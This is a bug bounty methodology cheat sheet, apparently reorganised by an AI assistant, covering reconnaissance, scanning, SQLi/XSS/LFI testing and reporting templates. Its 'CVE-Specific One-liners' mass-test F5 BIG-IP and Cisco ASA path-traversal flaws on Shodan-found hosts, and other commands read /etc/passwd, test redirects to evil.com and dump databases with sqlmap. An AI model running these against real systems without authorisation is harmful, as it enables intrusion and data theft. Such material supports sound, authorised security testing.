# 🐛 Bug Bounty Methodology & Tools

## �� Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Subdomain Enumeration](#subdomain-enumeration)
3. [Port Scanning & Service Discovery](#port-scanning--service-discovery)
4. [Vulnerability Testing](#vulnerability-testing)
5. [Web Application Security](#web-application-security)
6. [Automation & One-liners](#automation--one-liners)
7. [Reporting Templates](#reporting-templates)
8. [Tools & Resources](#tools--resources)

---

## 🔍 Reconnaissance

### Shodan (sqry) Queries

#### Basic Service Discovery
```bash
# HTTP/HTTPS Services
sqry -q "port:80" --json --limit 50
sqry -q "port:443" --json --limit 50

# Non-standard ports
sqry -q "port:8080" --json --limit 50
sqry -q "port:8443" --json --limit 50

# Database services
sqry -q "port:3306" --json --limit 50  # MySQL
sqry -q "port:5432" --json --limit 50  # PostgreSQL
sqry -q "port:27017" --json --limit 50 # MongoDB
```

#### Service-Specific Searches
```bash
# Jenkins servers
sqry -q "Jenkins" --json --limit 50

# Webcams
sqry -q "port:554" --json --limit 50
sqry -q "port:80" "webcam" --json --limit 50

# Apache servers
sqry -q "apache" --country US --json --limit 10

# SSL-enabled hosts
sqry -q "ssl:true" --domains --with-domains
```

#### Vulnerability-Focused Queries
```bash
# Critical vulnerabilities
sqry --min-cvss 9.0 --max-cvss 10.0 --json

# Known Exploited Vulnerabilities
sqry --kev --json --limit 10

# Specific CVE search
sqry --cve CVE-2016-10087 --cve-json --pretty
```

### Asset Discovery
```bash
# ASN enumeration
amass intel -asn <ASN_Number> -o asn_ips.txt

# Shodan network search
shodan search "net:<ip_range>" --fields ip_str,port --limit 100

# Censys search
censys search "autonomous_system.asn:<ASN_Number>" -o censys_assets.txt
```

---

## 🌐 Subdomain Enumeration

### Passive Enumeration
```bash
# Basic subdomain discovery
subfinder -d <domain> -o subdomains.txt
subfinder -d <domain> -silent -o subdomains.txt

# Amass enumeration
amass enum -d <domain> -o subdomains.txt
amass enum -d <domain> -brute -o subdomains.txt

# Assetfinder
assetfinder --subs-only <domain> | tee -a domains.txt
```

### Active Enumeration
```bash
# DNS bruteforce
subfinder -d <domain> -b -o subdomains.txt

# DNS over HTTPS
while read sub; do 
  echo "https://dns.google.com/resolve?name=$sub.<domain>&type=A&cd=true" | 
  parallel -j100 -q curl -s -L --silent | 
  grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | 
  jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | 
  grep ".<domain>" | sort -u
done < wordlist.txt
```

### External Sources
```bash
# RapidDNS
export host="<domain>"
curl -s "https://rapiddns.io/subdomain/$host?full=1#result" | 
grep -e "<td>.*$host</td>" | 
grep -oP '(?<=<td>)[^<]+' | sort -u

# BufferOver
curl -s https://dns.bufferover.run/dns?q=.<domain> | 
jq -r .FDNS_A[] | cut -d',' -f2 | sort -u

# VirusTotal
curl -s "https://www.virustotal.com/ui/domains/<domain>/subdomains?limit=40" | 
grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

# Archive.org
curl -s "http://web.archive.org/cdx/search/cdx?url=*.<domain>/*&output=text&fl=original&collapse=urlkey" | 
sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```

---

## 🔌 Port Scanning & Service Discovery

### Nmap Scanning
```bash
# Basic service scan
nmap -sV <target_ip>

# Aggressive scan with OS detection
nmap -A <target_ip>

# Ping scan
nmap -sP <target_range>

# Full port scan
nmap -p- --min-rate 1000 -T4 -A <target> -oA fullscan
```

### Masscan
```bash
# High-speed port scan
masscan -p0-65535 <target> --rate 100000 -oG masscan-results.txt
```

### Naabu
```bash
# Fast port scanning
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
```

### LazyHunter (CVE Analysis)
```bash
# CVE and port scanning
hunter.py --cve+ports --target <target_ip> --json-output results.json

# Bulk scanning
hunter.py --cve+ports --target targets.txt --json-output bulk_scan.json

# Quick scan
hunter.py --host --ports --target <target_ip> --json-output quick_scan.json
```

---

## 🛡️ Vulnerability Testing

### SQL Injection
```bash
# Basic SQLi testing
ghauri -u "https://target.com?id=1" --dbs --batch

# Automated SQLi testing
cat potential_sqli.txt | sqlmap --batch --random-agent --level=3 --risk=2

# SQLi one-liner
cat domains.txt | httpx | waybackurls | gf sqli | sqlmap -m sqli.txt --dbs --batch --level 3 --risk 2 --time-sec 10 --random-agent
```

### Cross-Site Scripting (XSS)
```bash
# XSS testing with dalfox
gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | 
grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt

# XSS with bxss
cat potential_xss.txt | bxss -appendMode -payload '"<svg/onload=alert(1)>">'

# XSS header testing
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do 
  xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) 
  xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) 
  xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) 
  xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2)
  echo -e '\e[1;32m$url\e[0m''\n''Method[1] X-Forwarded-For: xss+ssrf => $xss1''\n''Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2''\n''Method[3] Host: xss+ssrf ==> $xss3''\n''Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ''\n'
done
```

### Local File Inclusion (LFI)
```bash
# LFI testing
cat live_websites.txt | gf lfi | qsreplace "/etc/passwd" | 
xargs -I@ curl -s @ | grep "root:x:" > lfi_results.txt

# LFI with ffuf
waymore -i "" -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | 
while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:" -v; done
```

### Open Redirect
```bash
# Open redirect testing
export LHOST="https://evil.com"
gau <domain> | gf redirect | qsreplace "$LHOST" | 
xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

### CSRF Testing
```bash
# CSRF endpoint discovery
cat live_websites.txt | gf csrf | tee csrf_endpoints.txt
```

### Subdomain Takeover
```bash
# Subdomain takeover detection
subzy --targets subs.txt --concurrency 100

# DNS CNAME check
cat subs.txt | dnsprobe -r CNAME
```

---

## 🌐 Web Application Security

### Endpoint Discovery
```bash
# Wayback URLs
cat domains.txt | waybackurls | tee -a urls.txt

# GAU (Get All URLs)
gau <domain> -o gau_urls.txt

# Katana crawling
katana -u livehosts.txt -d 5 waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o endpoints.txt

# Aggregate endpoints
cat wayback_urls.txt gau_urls.txt katana_urls.txt | sort -u > aggregated_endpoints.txt
```

### Parameter Discovery
```bash
# Arjun for parameter discovery
arjun -q -u target -oT arjun && cat arjun | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss
```

### JavaScript Analysis
```bash
# Extract JS files
katana -u livehosts.txt -jc -o jsfiles.txt

# Extract endpoints from JS
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

# JS secrets extraction
cat js_files.txt | grep -Ei "key|token|auth|password" > sensitive_data.txt
```

### Screenshot Capture
```bash
# Single screenshot
gowitness single -u http://<target_domain> -s screenshot.png

# Batch screenshots
gowitness file -f urls.txt --threads 10

# Interactive with status
gowitness capture -u http://<target_domain> --status
```

---

## �� Automation & One-liners

### Complete Recon Pipeline
```bash
# 1. Subdomain enumeration
sublist3r -d target | tee -a domains.txt

# 2. Live host detection
cat domains.txt | httpx | tee -a alive.txt

# 3. URL collection
cat alive.txt | waybackurls | tee -a urls.txt

# 4. Vulnerability filtering
gf sqli urls >> sqli.txt
gf xss urls >> xss.txt
gf lfi urls >> lfi.txt

# 5. Automated testing
sqlmap -m sqli.txt --dbs --batch --level 3 --risk 2 --time-sec 10 --random-agent
```

### Nuclei Automation
```bash
# Basic nuclei scan
nuclei -l livehosts.txt -tags misconfig

# Specific vulnerability templates
nuclei -t prsnl/credentials-disclosure-all.yaml -c 30 -l livehosts.txt

# Subdomain + nuclei
subfinder -d intigriti.com | httpx | nuclei -tags exposure -o output.txt; notify -bulk -data output.txt
```

### CVE-Specific One-liners

#### CVE-2020-5902 (F5 BIG-IP)
```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | 
awk '{print $1":"$2}' | while read host; do 
  curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | 
  grep -q root && printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n"
done
```

#### CVE-2020-3452 (Cisco ASA)
```bash
while read LINE; do 
  curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | 
  head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"
done < HOSTS.txt
```

#### CVE-2022-0378
```bash
cat URLS.txt | while read h; do 
  curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|
  grep -qs "onmouse" && echo "$h: VULNERABLE"
done
```

---

## 📝 Reporting Templates

### Executive Summary Template
```
## Executive Summary
- **Target**: [Target Name]
- **Scope**: [In-scope domains/IPs]
- **Testing Period**: [Start Date] - [End Date]
- **Total Vulnerabilities**: [Number]
- **Critical**: [Number]
- **High**: [Number]
- **Medium**: [Number]
- **Low**: [Number]
- **Informational**: [Number]
```

### Vulnerability Report Template
```
## [Vulnerability Title]

**Severity**: [Critical/High/Medium/Low/Informational]
**CVSS Score**: [X.X]
**Affected Component**: [URL/Endpoint]
**Discovery Date**: [Date]

### Description
[Detailed description of the vulnerability]

### Impact
[Potential impact if exploited]

### Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Proof of Concept
[Include screenshots, request/response logs, or code snippets]

### Remediation
[Recommended fixes and mitigation steps]

### References
[Links to CVE, OWASP, or other resources]
```

---

## ️ Tools & Resources

### Essential Tools
- **Reconnaissance**: subfinder, amass, assetfinder, shodan-cli
- **Port Scanning**: nmap, masscan, naabu
- **Web Testing**: httpx, katana, waybackurls, gau
- **Vulnerability Testing**: nuclei, sqlmap, ghauri, dalfox
- **Screenshots**: gowitness
- **DNS**: dig, dnsprobe

### Useful Wordlists
- **Subdomains**: SecLists/Discovery/DNS/subdomains-top1million-5000.txt
- **Parameters**: SecLists/Discovery/Web-Content/burp-parameter-names.txt
- **Payloads**: PayloadsAllTheThings

### Browser Extensions
- **OWASP Scanner**: [JavaScript bookmarklet provided in original notes]
- **Wappalyzer**: Technology detection
- **FoxyProxy**: Proxy management

### API Keys Required
- Shodan API
- VirusTotal API
- Censys API
- SecurityTrails API

---

## 📚 Additional Resources

### Learning Materials
- OWASP Top 10
- PortSwigger Web Security Academy
- HackerOne Hacker101
- Bug Bounty Reports Database

### Practice Platforms
- HackerOne
- Bugcrowd
- Intigriti
- PentesterLab
- WebGoat

### Communities
- Twitter Bug Bounty Community
- Discord Security Servers
- Reddit r/netsec
- GitHub Security Repositories

---

*Last Updated: [Current Date]*
*Version: 2.0*
```

I've created a comprehensive, well-organized bug bounty methodology file that categorizes all your notes into logical sections. The new structure includes:

## Key Improvements:

1. **Clear Table of Contents** - Easy navigation
2. **Categorized Sections** - Related techniques grouped together
3. **Code Blocks** - Properly formatted commands with syntax highlighting
4. **Purpose Statements** - Each technique explains what it does
5. **Templates** - Ready-to-use reporting templates
6. **Resource Lists** - Tools, wordlists, and learning materials
7. **One-liners** - Preserved your valuable automation scripts
8. **CVE-Specific** - Organized known vulnerability exploits

## Main Categories:

- **Reconnaissance** - Shodan queries, asset discovery
- **Subdomain Enumeration** - Passive/active techniques
- **Port Scanning** - Nmap, Masscan, Naabu
- **Vulnerability Testing** - SQLi, XSS, LFI, etc.
- **Web Application Security** - Endpoint discovery, JS analysis
- **Automation** - Complete pipelines and one-liners
- **Reporting** - Professional templates
- **Tools & Resources** - Everything you need

The file is now much more maintainable and easier to reference during bug bounty hunting. Each section is self-contained but cross-references related techniques. Would you like me to make any adjustments to the organization or add any specific sections?
